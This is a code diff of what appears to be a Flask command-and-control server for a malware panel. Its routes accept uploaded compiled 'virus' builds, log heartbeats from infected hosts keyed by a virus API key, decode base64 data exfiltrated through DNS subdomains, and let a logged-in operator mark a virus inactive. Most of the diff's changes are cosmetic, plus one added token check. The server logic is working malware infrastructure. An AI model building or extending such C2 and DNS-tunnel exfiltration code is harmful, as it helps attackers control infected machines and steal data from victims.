@@ -142,37 +142,29 @@ def upload_compiledJob():
         api_key = sanitise(request.headers.get('Authorization'))
         if not api_key:
             return jsonify({'message': 'API key is required'}), 403
-
         # Extract the job ID and file from the request
         job_id = request.form.get('job_id')
         file = request.files.get('compiled_file')
-
         if not job_id or not file:
             return jsonify({'message': 'Job ID and compiled file are required'}), 400
-
         # Fetch the compiling job
         compiling_job = CompilingHandler.query.get(job_id)
         if not compiling_job:
             return jsonify({'message': 'Compiling job not found'}), 404
-
         # Fetch the associated virus
         virus = Virus.query.get(compiling_job.virus_id)
         if not virus:
             return jsonify({'message': 'Associated virus not found'}), 404
-
         # Validate the API key
         if virus.virus_api != api_key:
             return jsonify({'message': 'Invalid API key'}), 403
-
         # Save the uploaded file
         filename = secure_filename(f"{virus.name}_{virus.id}.zip")
         filepath = os.path.join(uploadFolder, filename)
         file.save(filepath)
-
         # Update the virus with the file path
         virus.storage_path = filepath
         db.session.commit()
-
         # Mark the job as completed
         compiling_job.status = "done"
         db.session.commit()
@@ -202,10 +194,8 @@ def heartbeat():
         print(hostname)
         #hostname = request.form.get('host_name')
         print(virus_api)
-
         if not virus_api:
             return jsonify({'message': 'Authorization header missing'}), 400
-
         # Check if the virus exists with the provided API key
         virus = Virus.query.filter_by(virus_api=virus_api).first()
         # Getting host in order with virus ID in order to update the last heartbeat 
@@ -217,9 +207,7 @@ def heartbeat():
             db.session.commit()
         else:
             print("Could not get host")
-
         #host = Hosts.query.filter_by(host_name=hostname, virus_id=virus.id).first()
-
         if not virus:
             print("Invalid API key")
             return jsonify({'message': 'Invalid API key'}), 404
@@ -230,7 +218,6 @@ def heartbeat():
         else:
             print("Virus is not alive. Clean up required")
             return jsonify({'message': 'Virus is not alive. Clean up required.', 'is_alive': 'False'}), 200
-
     except Exception as e:
         print(f"Error in heartbeat: {e}")
         return jsonify({'message': 'Internal server error'}), 500
@@ -300,28 +287,23 @@ def dns_tunneling_handler():
         full_host = request.headers.get('Host')
         if not full_host:
             return jsonify({'message': 'Host header is required'}), 400
-
         # Get the subdomain portion 
         subdomain = full_host.split('.')[0]
         if not subdomain:
             return jsonify({'message': 'Invalid DNS tunneling format'}), 400
-
         # Decode the URL-safe Base64 payload
         try:
             decoded_data = base64.urlsafe_b64decode(subdomain).decode('utf-8')
         except Exception as e:
             return jsonify({'message': 'Invalid base64 payload in subdomain', 'error': str(e)}), 400
-
         # Log the received and decoded data
         print(f"Received subdomain (base64): {subdomain}")
         print(f"Decoded data: {decoded_data}")
-
         response = {
             'message': 'DNS tunneling processed successfully',
             'decoded_data': decoded_data,
         }
         return jsonify(response), 200
-
     except Exception as e:
         print(f"Error handling DNS tunneling: {e}")
         return jsonify({'message': 'An error occurred while processing DNS tunneling', 'error': str(e)}), 500
@@ -777,21 +759,23 @@ def delete_host():
 @login_required
 def set_inactive():
     try:
-        # Retrieve the virus ID from the request form data
-        virus_id = sanitise(request.form.get('virus_id'))
-        if not virus_id:
-            return jsonify({'message': 'Virus ID is required'}), 400
-        # Query the virus associated with the current user
-        virus = Virus.query.filter_by(id=virus_id, user_id=current_user.id).first()
-        if not virus:
-            return jsonify({'message': 'Virus not found or unauthorized'}), 404
-        # Update the is_alive attribute
-        virus.is_alive = False
-        db.session.commit()
-        flash('Virus set as inactive.', category='success')
-        return redirect(url_for('views.virus'))  
-        #return jsonify({'message': f'Virus {virus.name} has been marked as inactive.', 'status': 'success'}), 200
-
+        if validate_token():
+            # Retrieve the virus ID from the request form data
+            virus_id = sanitise(request.form.get('virus_id'))
+            if not virus_id:
+                return jsonify({'message': 'Virus ID is required'}), 400
+            # Query the virus associated with the current user
+            virus = Virus.query.filter_by(id=virus_id, user_id=current_user.id).first()
+            if not virus:
+                return jsonify({'message': 'Virus not found or unauthorized'}), 404
+            # Update the is_alive attribute
+            virus.is_alive = False
+            db.session.commit()
+            flash('Virus set as inactive.', category='success')
+            return redirect(url_for('views.virus'))
+        else:
+            flash('Authentication failed for token', category='error')
+            return redirect(url_for('auth.logout'))   
     except Exception as e:
         print(f"Error in set_inactive: {e}")
         
